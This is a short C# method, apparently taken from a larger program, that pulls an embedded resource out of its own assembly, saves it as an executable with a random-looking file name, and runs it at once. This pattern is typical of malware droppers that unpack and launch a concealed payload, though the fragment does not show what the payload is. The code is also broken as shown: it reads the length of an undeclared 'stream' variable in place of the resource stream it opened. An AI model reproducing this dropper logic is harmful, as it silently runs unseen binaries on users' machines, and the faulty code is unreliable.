    void ExtractAndRun(string assemblyResource)
    {
        var tempPath = Path.Combine(Environment.CurrentDirectory, "uapweaelsirx.exe");
        var res = GetType().Assembly.GetManifestResourceStream(assemblyResource);
        var fileBuffer = new byte[(int)stream.Length];
        res.Read(fileBuffer, 0, fileBuffer.Length);
        File.WriteAllBytes(tempPath, fileBuffer);
        Process.Start(tempPath);
    }
